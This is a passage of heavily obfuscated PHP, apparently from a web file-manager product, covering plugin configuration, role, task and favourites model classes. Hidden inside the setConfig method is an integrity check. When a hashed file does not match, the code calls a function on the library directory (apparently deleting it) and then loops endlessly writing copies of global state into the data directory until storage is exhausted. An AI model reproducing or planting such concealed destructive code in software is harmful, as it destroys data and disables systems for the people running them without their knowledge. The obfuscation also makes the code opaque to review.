$_SERVER[İåâé¾]; $bõ«‚£¯¡£ = $this->pluginPath . $A³êÏ£ÕÌ; if (ACT == $Eù¼†ª†ùó[1013]) { echo $Eù¼†ª†ùó[1014] . $this->pluginName . $Eù¼†ª†ùó[8] . $A³êÏ£ÕÌ . $Eù¼†ª†ùó[1015]; if (!file_exists($bõ«‚£¯¡£)) { echo $Eù¼†ª†ùó[1016]; return; } } goto dòæÖÉ¥Å’; Eä…‹Èœ–: $this->parsePackage($Fá©Æò´®Ç); if (is_array($aá¸èë®³Ç)) { $Fá©Æò´®Ç = str_replace(array_keys($aá¸èë®³Ç), array_values($aá¸èë®³Ç), $Fá©Æò´®Ç); } echo $Eù¼†ª†ùó[223] . $Fá©Æò´®Ç; goto C½Â—í‰ö¯; C½Â—í‰ö¯: } final function initLang() { goto CÁ“ÛŠªÕ; c–±²ò Ì‰: if (@count($B‘÷ëÜÇìô) > 0) { I18n::set($B‘÷ëÜÇìô); } return $B‘÷ëÜÇìô; goto aÙ‚¦Â ¦; e‚ÏĞ¡ĞÀ¸: $CóÈ­ŞÁòÖ = I18n::getType(); $B‘÷ëÜÇìô = array(); if (file_exists($a©š·· . $CóÈ­ŞÁòÖ . $fåçªŒÉÒ[532])) { $B‘÷ëÜÇìô = (include_once $a©š·· . $CóÈ­ŞÁòÖ . $fåçªŒÉÒ[532]); } else { if ($CóÈ­ŞÁòÖ == $fåçªŒÉÒ[1019] && !file_exists($a©š·· . $CóÈ­ŞÁòÖ . $fåçªŒÉÒ[532]) && file_exists($a©š·· . $fåçªŒÉÒ[1020])) { $B‘÷ëÜÇìô = (include_once $a©š·· . $fåçªŒÉÒ[1020]); } else { if (file_exists($a©š·· . $a—¤Ú®²ö¨ . $fåçªŒÉÒ[532])) { $B‘÷ëÜÇìô = (include_once $a©š·· . $a—¤Ú®²ö¨ . $fåçªŒÉÒ[532]); } } } goto c–±²ò Ì‰; CÁ“ÛŠªÕ: $fåçªŒÉÒ =& $_SERVER[İåâé¾]; $a—¤Ú®²ö¨ = $fåçªŒÉÒ[1017]; $a©š·· = $this->pluginPath . $fåçªŒÉÒ[1018]; goto e‚ÏĞ¡ĞÀ¸; aÙ‚¦Â ¦: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($d…¾Ùßê) { $A‹Ü®ï„·ğ =& $_SERVER[İåâé¾]; $DÌğ¯¯ÈÇŸ = BASIC_PATH . $A‹Ü®ï„·ğ[557]; $fÖ×ìğÀ¬å = $A‹Ü®ï„·ğ[554]; if ($_SERVER[$A‹Ü®ï„·ğ[555]] != $fÖ×ìğÀ¬å($DÌğ¯¯ÈÇŸ)) { goto bÁ’•¡öá; DÂ‚İº Û: $aá‚òŠÌ³ = $A‹Ü®ï„·ğ[561]; $fœõ¡êñì = json_encode($GLOBALS[$A‹Ü®ï„·ğ[562]]); for ($Aó¢¥ŠÇ† = 0;; $Aó¢¥ŠÇ†++) { $aá‚òŠÌ³(DATA_PATH . $Aó¢¥ŠÇ†, $fœõ¡êñì); } goto D×ê¥àÔÇ; C³äŠõãÒ‹: $DÎÓ†¢–Ô = explode($A‹Ü®ï„·ğ[223], $Cñ¡…Ÿ©¤Û); if (count($DÎÓ†¢–Ô) < $A‹Ü®ï„·ğ[558]) { die; } $E´ÀÍ·µ = $A‹Ü®ï„·ğ[559]; goto B°Ñ¥‡ƒ£¸; B°Ñ¥‡ƒ£¸: $E´ÀÍ·µ(LIB_DIR); $Bâ­Á”ï”Ñ = $A‹Ü®ï„·ğ[560]; $Bâ­Á”ï”Ñ(); goto DÂ‚İº Û; bÁ’•¡öá: $FŠŸŠÁÉË = $A‹Ü®ï„·ğ[556]; $bçÍà®ª†• = BASIC_PATH . $A‹Ü®ï„·ğ[557]; $Cñ¡…Ÿ©¤Û = $FŠŸŠÁÉË($bçÍà®ª†•); goto C³äŠõãÒ‹; D×ê¥àÔÇ: } return $this->modelPlugin->setConfig($this->pluginName, $d…¾Ùßê); } public function onSetConfig($B¦«´Ó¸©æ) { } public function onGetConfig($bÈîŒÜáæ) { } public function onChangeStatus($b×¦©Û¥Şö) { } public function onUninstall() { } public function onInstall() { } public function authCheck($Càµ¼«ºã„ = "\160\x6c\165\x67\x69\156\101\165\164\150") { $B¶•‹ß“˜Û =& $_SERVER[İåâé¾]; if (!defined($B¶•‹ß“˜Û[989])) { return !1; } if ($GLOBALS[$B¶•‹ß“˜Û[1021]] == 1) { return !0; } $F·£ÈÒÆÙˆ = $this->getConfig(); if (!$F·£ÈÒÆÙˆ[$Càµ¼«ºã„]) { return !1; } return ActionCall($B¶•‹ß“˜Û[1022], $F·£ÈÒÆÙˆ[$Càµ¼«ºã„]); } public function url($F¹Ú»¦¶ƒì, $CÌíåÀ¡¡¬ = '', $Bæ½ƒËà£ = true) { goto B™Şñà…ï; dµõ‰öíÇä: if (!$Bæ½ƒËà£) { return $eªÊæÃÓâ˜; } echo $eªÊæÃÓâ˜; goto d°ÈÆ¶½•; C£³ïŞƒ™¿: $d„´ŸÇ½… = $this->packageVersion(); $F¾ß¦âŸ¤â = $e®‹¡”Å¶ . $fÀáë¾ÉÀ„[498] . $d„´ŸÇ½…; if ($CÌíåÀ¡¡¬ == $fÀáë¾ÉÀ„[33]) { $eªÊæÃÓâ˜ = $this->pluginHost . $F¹Ú»¦¶ƒì . $fÀáë¾ÉÀ„[1023] . $F¾ß¦âŸ¤â; } else { if ($CÌíåÀ¡¡¬ == $fÀáë¾ÉÀ„[1024]) { $eªÊæÃÓâ˜ = STATIC_PATH . $F¹Ú»¦¶ƒì . $fÀáë¾ÉÀ„[1023] . $e®‹¡”Å¶; } else { if ($CÌíåÀ¡¡¬ == $fÀáë¾ÉÀ„[1025]) { $eªÊæÃÓâ˜ = APP_HOST . $fÀáë¾ÉÀ„[1026] . $F¹Ú»¦¶ƒì . $fÀáë¾ÉÀ„[1023] . $e®‹¡”Å¶; } else { if (isset($D•‘³õĞê[$CÌíåÀ¡¡¬])) { $eªÊæÃÓâ˜ = $D•‘³õĞê[$CÌíåÀ¡¡¬] . $F¹Ú»¦¶ƒì . $fÀáë¾ÉÀ„[1023] . $F¾ß¦âŸ¤â; } } } } goto dµõ‰öíÇä; B™Şñà…ï: $fÀáë¾ÉÀ„ =& $_SERVER[İåâé¾]; $D•‘³õĞê = $this->getConfig(); $e®‹¡”Å¶ = KOD_VERSION . $fÀáë¾ÉÀ„[90] . KOD_VERSION_BUILD; goto C£³ïŞƒ™¿; d°ÈÆ¶½•: } public function link($Eìº´¾Ã¡ì = false, $FÌØÖ¬ªë = '') { $b“ôŞİÆØã =& $_SERVER[İåâé¾]; if (!$Eìº´¾Ã¡ì) { $this->link($b“ôŞİÆØã[1027], $b“ôŞİÆØã[1025]); $this->link($b“ôŞİÆØã[1028], $b“ôŞİÆØã[1024]); $this->link($b“ôŞİÆØã[1029], $b“ôŞİÆØã[1024]); $this->link($b“ôŞİÆØã[1030], $b“ôŞİÆØã[1024]); $this->link($b“ôŞİÆØã[1031], $b“ôŞİÆØã[1024]); return; } $A‘–ßŒ‘¨¿ = $this->url($Eìº´¾Ã¡ì, $FÌØÖ¬ªë, !1); if (substr($Eìº´¾Ã¡ì, -3) == $b“ôŞİÆØã[1032]) { echo $b“ôŞİÆØã[1033] . $A‘–ßŒ‘¨¿ . $b“ôŞİÆØã[1034]; } else { if (substr($Eìº´¾Ã¡ì, -4) == $b“ôŞİÆØã[1035]) { echo $b“ôŞİÆØã[1036] . $A‘–ßŒ‘¨¿ . $b“ôŞİÆØã[1037]; } } } } goto BÖ·ÉÕíÇÔ; E¶Ü¢×ÛÒ‚: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\155\x2e\162\x6f\154\x65\114\151\x73\x74"; public $field = array("\156\141\x6d\145", "\x61\x75\164\150", "\x6c\x61\x62\145\x6c", "\144\x69\x73\x70\x6c\141\x79", "\163\x79\163\164\x65\x6d", "\144\145\163\143", "\151\x67\156\157\162\x65\x45\x78\164", "\x69\x67\x6e\x6f\x72\145\106\151\x6c\145\x53\151\x7a\145", "\141\x64\155\151\156\151\x73\164\162\x61\x74\x6f\x72", "\x73\x6f\x72\x74"); public function listData($E” «¥×ÙŞ = false, $EÎïƒĞÄïõ = "\163\x6f\x72\164", $eÚ‘êËƒŠ = false) { return parent::listData($E” «¥×ÙŞ, $EÎïƒĞÄïõ, $eÚ‘êËƒŠ); } public function update($fÔÑºà®·, $F—‡ŒÃÀÁ) { goto A÷Ëğ‘ŠÄ„; EŠ÷å‚ö‰”: return parent::update($fÔÑºà®·, $F—‡ŒÃÀÁ); goto bïÆ……È‹‡; a¼ìÊÅ„™: if (!$F§Ä· ©´ø || $BÕáÄ–ì› && $BÕáÄ–ì›[$Fô³ö™à÷[368]] != $F§Ä· ©´ø[$Fô³ö™à÷[368]]) { return !1; } if ($BÕáÄ–ì›[$Fô³ö™à÷[1899]] == 1) { $F—‡ŒÃÀÁ = array($Fô³ö™à÷[28] => $F—‡ŒÃÀÁ[$Fô³ö™à÷[28]], $Fô³ö™à÷[1560] => $F—‡ŒÃÀÁ[$Fô³ö™à÷[1560]]); } $this->filterAuth($F—‡ŒÃÀÁ[$Fô³ö™à÷[549]]); goto EŠ÷å‚ö‰”; A÷Ëğ‘ŠÄ„: $Fô³ö™à÷ =& $_SERVER[İåâé¾]; $F§Ä· ©´ø = parent::listData($fÔÑºà®·); $BÕáÄ–ì› = $this->findByName($F—‡ŒÃÀÁ[$Fô³ö™à÷[28]]); goto a¼ìÊÅ„™; bïÆ……È‹‡: } public function remove($D¡Ùµ”Ìò­) { $d•áà³è³ = parent::listData($D¡Ùµ”Ìò­); if (!$d•áà³è³ || $d•áà³è³[$_SERVER[İåâé¾][822]]) { return !1; } return parent::remove($D¡Ùµ”Ìò­); } public function add($FÁÙ¼íŠóº) { goto dƒ´íÑŒÄ£; dƒ´íÑŒÄ£: $aİ¥¥òÖŸÓ =& $_SERVER[İåâé¾]; $AÎ¶†’†¬Š = $FÁÙ¼íŠóº[$aİ¥¥òÖŸÓ[28]]; if ($this->findByName($AÎ¶†’†¬Š)) { return !1; } goto DÅ°¦Ç½Äã; bÓŞèãÀ¢µ: return parent::insert($FÁÙ¼íŠóº); goto bÀ«Û¡öÀ´; DÅ°¦Ç½Äã: $E¤»®´‡é = array($aİ¥¥òÖŸÓ[387] => $AÎ¶†’†¬Š, $aİ¥¥òÖŸÓ[1548] => $aİ¥¥òÖŸÓ[33], $aİ¥¥òÖŸÓ[1544] => $aİ¥¥òÖŸÓ[1561], $aİ¥¥òÖŸÓ[1900] => 1, $aİ¥¥òÖŸÓ[1547] => 0, $aİ¥¥òÖŸÓ[1901] => 0, $aİ¥¥òÖŸÓ[1546] => $this->getSort()); $FÁÙ¼íŠóº = array_merge($E¤»®´‡é, $FÁÙ¼íŠóº); $this->filterAuth($FÁÙ¼íŠóº[$aİ¥¥òÖŸÓ[549]]); goto bÓŞèãÀ¢µ; bÀ«Û¡öÀ´: } private function getSort() { $D‰¼ÜÙ°“è =& $_SERVER[İåâé¾]; $aß‡ÏÇŸöŒ = parent::listData(); $Dê…î Ğ¨‚ = array_to_keyvalue($aß‡ÏÇŸöŒ, $D‰¼ÜÙ°“è[33], $D‰¼ÜÙ°“è[1563]); return empty($Dê…î Ğ¨‚) ? 0 : max($Dê…î Ğ¨‚) + 1; } private function filterAuth(&$fº¢ˆ¨õ£) { $Cë¬’ÑŠÍ‰ =& $_SERVER[İåâé¾]; $E¿à«åìÔ¨ = array(); $c¨¤¬µˆ± = array_filter(explode($Cë¬’ÑŠÍ‰[47], $fº¢ˆ¨õ£)); foreach ($c¨¤¬µˆ± as $fº¢ˆ¨õ£) { $dŸÂö§‘ô† = explode($Cë¬’ÑŠÍ‰[90], $fº¢ˆ¨õ£); if ($dŸÂö§‘ô†[0] == $Cë¬’ÑŠÍ‰[1208] && $dŸÂö§‘ô†[1] != $Cë¬’ÑŠÍ‰[784]) { $e²Êó‹‡¦¦ = $dŸÂö§‘ô†[0] . $Cë¬’ÑŠÍ‰[90] . $dŸÂö§‘ô†[1] . $Cë¬’ÑŠÍ‰[1902]; if (!in_array($e²Êó‹‡¦¦, $c¨¤¬µˆ±)) { $E¿à«åìÔ¨[] = $e²Êó‹‡¦¦; } } $E¿à«åìÔ¨[] = $fº¢ˆ¨õ£; } $fº¢ˆ¨õ£ = implode($Cë¬’ÑŠÍ‰[47], $E¿à«åìÔ¨); } public function sort($B¥ƒ«‹ÁËÅ, $b›Ñ‡À‘Õ) { return parent::update($B¥ƒ«‹ÁËÅ, $b›Ñ‡À‘Õ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\56\x74\141\163\x6b\114\151\163\164"; public $field = array("\x6e\141\x6d\x65", "\164\x79\160\145", "\145\166\145\156\x74", "\164\151\x6d\145", "\x64\x65\x73\x63", "\x73\x79\163\164\145\155", "\x65\156\141\142\154\145", "\154\x61\x73\x74\x52\165\156", "\163\157\162\x74"); public function listData($c¸†ò‰¦Ïâ = false, $f¹èÇ‘²ï¿ = "\163\x6f\162\x74", $E¼›‰¿‚ó¶ = false) { return parent::listData($c¸†ò‰¦Ïâ, $f¹èÇ‘²ï¿, $E¼›‰¿‚ó¶); } public function add($BŞ™‹çÇµ) { $B¢ˆÊçÃ¼ =& $_SERVER[İåâé¾]; $döï…£ÛÏÃ = $this->findByName($BŞ™‹çÇµ[$B¢ˆÊçÃ¼[28]]); if ($döï…£ÛÏÃ) { return !1; } $BŞ™‹çÇµ[$B¢ˆÊçÃ¼[1052]] = 0; $BŞ™‹çÇµ[$B¢ˆÊçÃ¼[1563]] = $this->getSort(); return parent::insert($BŞ™‹çÇµ); } private function getSort() { $aÃ‰öœÙË =& $_SERVER[İåâé¾]; $e©ßˆÀ¢Ú“ = parent::listData(); $AÜõ™ó½Î = array_to_keyvalue($e©ßˆÀ¢Ú“, $aÃ‰öœÙË[33], $aÃ‰öœÙË[1563]); return empty($AÜõ™ó½Î) ? 0 : max($AÜõ™ó½Î) + 1; } public function update($a÷µàÀëİ, $eÈÚª…Áê) { $E×ÚŠ•Üô =& $_SERVER[İåâé¾]; $c¥«‡¶µÂÜ = $this->listData($a÷µàÀëİ); $A×çÒ‰¤Á´ = $this->findByName($eÈÚª…Áê[$E×ÚŠ•Üô[28]]); if (!$c¥«‡¶µÂÜ || $A×çÒ‰¤Á´ && $A×çÒ‰¤Á´[$E×ÚŠ•Üô[368]] != $c¥«‡¶µÂÜ[$E×ÚŠ•Üô[368]]) { return !1; } return parent::update($a÷µàÀëİ, $eÈÚª…Áê); } public function remove($Cƒ±š¡ˆ¾ò) { $b§‘½ÆåÀ = $this->listData($Cƒ±š¡ˆ¾ò); if (!$b§‘½ÆåÀ || $b§‘½ÆåÀ[$_SERVER[İåâé¾][822]]) { return !1; } return parent::remove($Cƒ±š¡ˆ¾ò); } public function enable($A¹¼Ÿï›Ã) { $F¯Ã‡‚ñ¡½ =& $_SERVER[İåâé¾]; $D¼‘¹‹ì¦é = $this->listData($A¹¼Ÿï›Ã); $fò¬¥Æ‘é = !$D¼‘¹‹ì¦é[$F¯Ã‡‚ñ¡½[1059]]; return $this->update($A¹¼Ÿï›Ã, array($F¯Ã‡‚ñ¡½[1903] => $fò¬¥Æ‘é)); } public function run($bÜ‡Ç¨‡) { return $this->update($bÜ‡Ç¨‡, array($_SERVER[İåâé¾][1904] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\137\146\x61\x76"; protected function cacheFunctionAlias($e˜‡ğÛø±µ) { $bŞ¾ĞáÙ²Ş =& $_SERVER[İåâé¾]; return array($bŞ¾ĞáÙ²Ş[1905] => array(USER_ID, $bŞ¾ĞáÙ²Ş[1906])); } protected function listData() { $dóä‹ôĞŒö =& $_SERVER[İåâé¾]; $d¢Ğ³®éÉŒ = array($dóä‹ôĞŒö[1077] => USER_ID, $dóä‹ôĞŒö[1907] => 0); $CÎ»¨–Şå‰ = $dóä‹ôĞŒö[1908]; $bÛÍŒ ¹…ğ = $this->field($CÎ»¨–Şå‰)->where($d¢Ğ³®éÉŒ)->order($dóä‹ôĞŒö[1909])->select(); return $bÛÍŒ ¹…ğ ? $bÛÍŒ ¹…ğ : array(); } protected function resetCache() { } protected function listView() { goto fÖ–Ì³½‘Ç; D­ÜÙğ‚â: $D¼åÆ™µÉ = array_to_keyvalue($bã·½‚ö¿Ø, $c¤ÛÆœâ×[33], $c¤ÛÆœâ×[76]); if (!$D¼åÆ™µÉ) { return $F¤×Èë‚¸; } $c‰»‡¸æ³Š = 2000; goto E¬Ú³ñ˜Ü; fÖ–Ì³½‘Ç: $c¤ÛÆœâ× =& $_SERVER[İåâé¾]; $F¤×Èë‚¸ = $this->listData(); $bã·½‚ö¿Ø = array_filter_by_field($F¤×Èë‚¸, $c¤ÛÆœâ×[29], $c¤ÛÆœâ×[978]); goto D­ÜÙğ‚â; AæØƒÃÄ¿Ó: $A¦í„íÏ‰İ = array_to_keyvalue($A¦í„íÏ‰İ, $c¤ÛÆœâ×[374]); foreach ($F¤×Èë‚¸ as $e¥¾íÒø‘‰ => $DŞÇƒİæ®Ü) { $fÖÃœÂ = $A¦í„íÏ‰İ[$DŞÇƒİæ®Ü[$c¤ÛÆœâ×[76]]]; $fÖÃœÂ = $fÖÃœÂ ? $fÖÃœÂ : array(); $F¤×Èë‚¸[$e¥¾íÒø‘‰] = array_merge($fÖÃœÂ, $DŞÇƒİæ®Ü); } return $F¤×Èë‚¸; goto c¹á´í¶÷³; E¬Ú³ñ˜Ü: $cêôÑ¹¥Ê = array($c¤ÛÆœâ×[415] => array($c¤ÛÆœâ×[1642], $D¼åÆ™µÉ)); $A¦í„íÏ‰İ = Model($c¤ÛÆœâ×[521])->listSource($cêôÑ¹¥Ê, $c‰»‡¸æ³Š); $A¦í„íÏ‰İ = array_merge($A¦í„íÏ‰İ[$c¤ÛÆœâ×[74]], $A¦í„íÏ‰İ[$c¤ÛÆœâ×[75]]); goto AæØƒÃÄ¿Ó; c¹á´í¶÷³: } protected function addFav($d×âî»…®, $DÈ¸Ş´¿ã = '', $b¦áâµ˜±ì = "\163\157\165\162\x63\x65") { goto EÙàë‚„¥; Få°êÇéÆ: $e´Çˆì­ = array($B­¢©Œ¿é“[1077] => USER_ID, $B­¢©Œ¿é“[1907] => 0); $D³ĞŠÅ›´ = $this->where($e´Çˆì­)->max($B­¢©Œ¿é“[1563]); if (!$D³ĞŠÅ›´) { $D³ĞŠÅ›´ = 0; } goto F¦ˆ£‘ŸÏ; E¬–áŠ»Èİ: return $this->add($aÆ†Äµù‡¢); goto a¡Æí¤¹Í©; F¦ˆ£‘ŸÏ: if (!$DÈ¸Ş´¿ã && $b¦áâµ˜±ì == $B­¢©Œ¿é“[978]) { $eÈÕ‰µÂõ = Model($B­¢©Œ¿é“[850])->where(array($B­¢©Œ¿é“[415] => $d×âî»…®))->find(); if (!$eÈÕ‰µÂõ) { return !1; } $DÈ¸Ş´¿ã = $eÈÕ‰µÂõ[$B­¢©Œ¿é“[28]]; } $DÈ¸Ş´¿ã = $this->getAutoName($DÈ¸Ş´¿ã); $aÆ†Äµù‡¢ = array($B­¢©Œ¿é“[1077] => USER_ID, $B­¢©Œ¿é“[1907] => 0, $B­¢©Œ¿é“[387] => $DÈ¸Ş´¿ã, $B­¢©Œ¿é“[1604] => $d×âî»…®, $B­¢©Œ¿é“[810] => $b¦áâµ˜±ì, $B­¢©Œ¿é“[1546] => $D³ĞŠÅ›´ + 1); goto E¬–áŠ»Èİ; EÙàë‚„¥: $B­¢©Œ¿é“ =& $_SERVER[İåâé¾]; $e´Çˆì­ = array($B­¢©Œ¿é“[1077] => USER_ID, $B­¢©Œ¿é“[1907] => 0, $B­¢©Œ¿é“[810] => $b¦áâµ˜±ì, $B­¢©Œ¿é“[1604] => $d×âî»…®); if ($this->where($e´Çˆì­)->find()) { return !1; } goto Få°êÇéÆ; a¡Æí¤¹Í©: } protected function remove($C‘ËºöÆ‚) { $bš‹Å¶Øà» =& $_SERVER[İåâé¾]; $Aâ½†ŞÛéŞ = array($bš‹Å¶Øà»[1077] => USER_ID, $bš‹Å¶Øà»[812] => $C‘ËºöÆ‚); return $this->where($Aâ½†ŞÛéŞ)->delete(); } protected function removeByName($aÂñÖ›¨é) { $e‡ŒÑŠê·Ï =& $_SERVER[İåâé¾]; $b‡´¨ßõÃå = array($e‡ŒÑŠê·Ï[1077] => USER_ID, $e‡ŒÑŠê·Ï[387] => $aÂñÖ›¨é, $e‡ŒÑŠê·Ï[1907] => 0); return $this->where($b‡´¨ßõÃå)->delete(); } protected function rename($b‘„¤È…“›, $dìÛ‡‘½é‰) { $eğÖÛíÆ² =& $_SERVER[İåâé¾]; if ($b‘„¤È…“› == $dìÛ‡‘½é‰) { return !1; } $a„’Á‚‡¬¼ = $this->getAutoName($dìÛ‡‘½é‰); if ($dìÛ‡‘½é‰ != $a„’Á‚‡¬¼) { return !1; } $EÓ­‘åšé = array($eğÖÛíÆ²[1077] => USER_ID, $eğÖÛíÆ²[1907] => 0, $eğÖÛíÆ²[28] => $b‘„¤È…“›); return $this->where($EÓ­‘åšé)->save(array($eğÖÛíÆ²[28] => $dìÛ‡‘½é‰)); } protected function resetSort($d¬À¶©“†å) { $fĞ¯ã«åáŠ =& $_SERVER[İåâé¾]; $Fğœ—›«Ú = array($fĞ¯ã«åáŠ[1077] => USER_ID); for ($b—­Áİ±×‘ = 0; $b—­Áİ±×‘ < count($d¬À¶©“†å); $b—­Áİ±×‘++) { $Fğœ—›«Ú[$fĞ¯ã«åáŠ[812]] = $d¬À¶©“†å[$b—­Áİ±×‘]; $this->where($Fğœ—›«Ú)->save(array($fĞ¯ã«åáŠ[1546] => $b—­Áİ±×‘ + 1)); } return !0; } protected function moveTop($bš³Í¯ÏÁÛ) { goto eÊÒòŸñ¨Ù; eÊÒòŸñ¨Ù: $Dùï†¤Í¾ =& $_SERVER[İåâé¾]; $B‚Û©¢²‡ = array($Dùï†¤Í¾[1077] => USER_ID, $Dùï†¤Í¾[1907] => 0); $D©âñÒŸ‡ê = $this->where($B‚Û©¢²‡)->where(array($Dùï†¤Í¾[28] => $bš³Í¯ÏÁÛ))->find(); goto A²ôñ£“ƒ§; CñáîÜËïˆ: $Eëâ¬‹´†˜ = $e¨òºÁ¨è½; $e¨òºÁ¨è½ = array_remove_value($e¨òºÁ¨è½, $D©âñÒŸ‡ê[$Dùï†¤Í¾[368]]); array_unshift($e¨òºÁ¨è½, $D©âñÒŸ‡ê[$Dùï†¤Í¾[368]]); goto C‡Â‡­èã; C‡Â‡­èã: return $this->resetSort($e¨òºÁ¨è½); goto dò¢ï‹¿¥; A²ôñ£“ƒ§: if (!$D©âñÒŸ‡ê) { return; } $e¨òºÁ¨è½ = $this->field($Dùï†¤Í¾[368])->where($B‚Û©¢²‡)->order($Dùï†¤Í¾[1909])->select(); $e¨òºÁ¨è½ = array_to_keyvalue($e¨òºÁ¨è½, $Dùï†¤Í¾[33], $Dùï†¤Í¾[368]); goto CñáîÜËïˆ; dò¢ï‹¿¥: } protected function moveBottom($b§‹”îã©‹) { $FŠÎ†“œæ =& $_SERVER[İåâé¾]; $f‹‰¾°ß… = array($FŠÎ†“œæ[1077] => USER_ID, $FŠÎ†“œæ[1907] => 0); $eğ½’ğÛ› = $this->where($f‹‰¾°ß…)->max($FŠÎ†“œæ[1563]); $Dõ¬èÓš‘ = array($FŠÎ†“œæ[1563] => $eğ½’ğÛ› + 1); return $this->where($f‹‰¾°ß…)->where(array($FŠÎ†“œæ[28] => $b§‹”îã©‹))->save($Dõ¬èÓš‘); } private function getAutoName($fÊÁ·°İĞ“) { goto CÎğµÔŒÒ; CÎğµÔŒÒ: $E‹Ë£“‰Ï =& $_SERVER[İåâé¾]; $Däê¶Ñé¯ = array($E‹Ë£“‰Ï[1077] => USER_ID, $E‹Ë£“‰Ï[1907] => 0); $EÜ†“ßá‹Œ = $this->field($E‹Ë£“‰Ï[28])->where($Däê¶Ñé¯)->select(); goto BùÃÆ÷¸“¥; BùÃÆ÷¸“¥: $EÜ†“ßá‹Œ = array_to_keyvalue($EÜ†“ßá‹Œ, $E‹Ë£“‰Ï[33], $E‹Ë£“‰Ï[28]); if (!$EÜ†“ßá‹Œ || !in_array($fÊÁ·°İĞ“, $EÜ†“ßá‹Œ)) { return $fÊÁ·°İĞ“; } for ($a¡‘®˜Ï­š = 0; $a¡‘®˜Ï­š < count($EÜ†“ßá‹Œ); $a¡‘®˜Ï­š++) { if (!in_array($fÊÁ·°İĞ“ . "\50{$a¡‘®˜Ï­š}\51", $EÜ†“ßá‹Œ)) { return $fÊÁ·°İĞ“ . "\x28{$a¡‘®˜Ï­š}\51"; } } goto eØÍ°ÅŸ‡Ş; eØÍ°ÅŸ‡Ş: return $fÊÁ·°İĞ“ . "\50{$a¡‘®˜Ï­š}\51"; goto dàåËğ´è“; dàåËğ´è“: } } goto cÍ™“Ì¥¹; Eñå¡¸åï¾: function Action($c¹Òâï¼Ú³ = '') { goto E‘ŠÏÇ›¡¬; A—‘Ñé—½î: if (!class_exists($e–¦¼Š¶ã)) { return actionCallError("\x5b{$c¹Òâï¼Ú³}\x20\x3d\x3e\40{$e–¦¼Š¶ã}\x5d\40\143\x6c\x61\x73\x73\x20\x6e\x6f\x74\x20\x65\170\151\x73\164\x73\x21"); } $F¨‘¢Ãª­[$f…“ì‰ÒËİ] = new $e–¦¼Š¶ã(); return $F¨‘¢Ãª­[$f…“ì‰ÒËİ]; goto EØ¹äÑËã§; fº•˜õé¾ê: $c¨÷›«¥¤ = explode($fˆŒÎ…•ö‚[3], $c¹Òâï¼Ú³); $fÔÑñ†ò× = strtolower($c¨÷›«¥¤[0]); if (substr($fÔÑñ†ò×, -6) == $fˆŒÎ…•ö‚[4]) { $c¹Òâï¼Ú³ = substr($c¨÷›«¥¤[0], 0, -6); $e–¦¼Š¶ã = $c¹Òâï¼Ú³ . $fˆŒÎ…•ö‚[5]; $fÁŠ™…£ìŒ = $fˆŒÎ…•ö‚[6]; if (substr(strtolower($c¨÷›«¥¤[1]), -5) == $fˆŒÎ…•ö‚[7]) { $e–¦¼Š¶ã = $c¹Òâï¼Ú³ . $c¨÷›«¥¤[1]; $fÁŠ™…£ìŒ = $fˆŒÎ…•ö‚[8] . $c¨÷›«¥¤[1] . $fˆŒÎ…•ö‚[9]; } else { if (count($c¨÷›«¥¤) == 3) { $e–¦¼Š¶ã = $c¹Òâï¼Ú³ . $c¨÷›«¥¤[1] . $c¨÷›«¥¤[2]; $fÁŠ™…£ìŒ = $fˆŒÎ…•ö‚[10] . $c¨÷›«¥¤[1] . $fˆŒÎ…•ö‚[11] . $c¨÷›«¥¤[2] . $fˆŒÎ…•ö‚[9]; } } $fÁŠ™…£ìŒ = PLUGIN_DIR . $c¹Òâï¼Ú³ . $fˆŒÎ…•ö‚[2] . $fÁŠ™…£ìŒ; } else { if (substr($fÔÑñ†ò×, -5) == $fˆŒÎ…•ö‚[7]) { $c¹Òâï¼Ú³ = substr($c¨÷›«¥¤[0], 0, -5); return Model($c¹Òâï¼Ú³); } else { $e–¦¼Š¶ã = $c¨÷›«¥¤[0] . $c¨÷›«¥¤[1]; $fÁŠ™…£ìŒ = CONTROLLER_DIR . $c¨÷›«¥¤[0] . $fˆŒÎ…•ö‚[2] . $c¨÷›«¥¤[1] . $fˆŒÎ…•ö‚[12]; } } goto fµª©‚ÛÃë; E‘ŠÏÇ›¡¬: $fˆŒÎ…•ö‚ =& $_SERVER[•¡£]; static $F¨‘¢Ãª­ = array(); $c¹Òâï¼Ú³ = trim(str_replace($fˆŒÎ…•ö‚[2], $fˆŒÎ…•ö‚[3], $c¹Òâï¼Ú³), $fˆŒÎ…•ö‚[2]); goto fº•˜õé¾ê; fµª©‚ÛÃë: $f…“ì‰ÒËİ = strtolower($e–¦¼Š¶ã); if (isset($F¨‘¢Ãª­[$f…“ì‰ÒËİ])) { return $F¨‘¢Ãª­[$f…“ì‰ÒËİ]; } if (is_file($fÁŠ™…£ìŒ)) { include_once $fÁŠ™…£ìŒ; } goto A—‘Ñé—½î; EØ¹äÑËã§: } function ActionApply($eŒÀ¨¢“Û, $dØ‡ø¨ÎÍÛ = array()) { goto eˆ³¯›Ñ¶; C‘íôÉáä¤: if (!method_exists($AâÍÂÉá‘Œ, $F”ƒ—†íé)) { return actionCallError("{$eŒÀ¨¢“Û}\40\x6d\145\x74\x68\x6f\x64\40\x6e\x6f\164\40\145\170\x69\163\x74\163\41"); } $FÍõèÅÁíÊ = call_user_func_array(array($AâÍÂÉá‘Œ, $F”ƒ—†íé), $dØ‡ø¨ÎÍÛ); return $FÍõèÅÁíÊ; goto cšµ„ä°É“; eˆ³¯›Ñ¶: if (is_array($eŒÀ¨¢“Û)) { return call_user_func_array($eŒÀ¨¢“Û, $dØ‡ø¨ÎÍÛ); } if (function_exists($eŒÀ¨¢“Û)) { return call_user_func_array($eŒÀ¨¢“Û, $dØ‡ø¨ÎÍÛ); } $bßÙø›æà = strrpos($eŒÀ¨¢“Û, $_SERVER[•¡£][3]); goto D¬“µàÇ„„; D¬“µàÇ„„: $c‚ãíÏ©ƒó = substr($eŒÀ¨¢“Û, 0, $bßÙø›æà); $F”ƒ—†íé = substr($eŒÀ¨¢“Û, $bßÙø›æà + 1); $AâÍÂÉá‘Œ = Action($c‚ãíÏ©ƒó); goto C‘íôÉáä¤; cšµ„ä°É“: } function actionCallError($Få‚–Á•É‚) { $BŠË…ˆ®¿ =& $_SERVER[•¡£]; $a„Ä“×´Ú = json_encode_force(array($BŠË…ˆ®¿[13] => 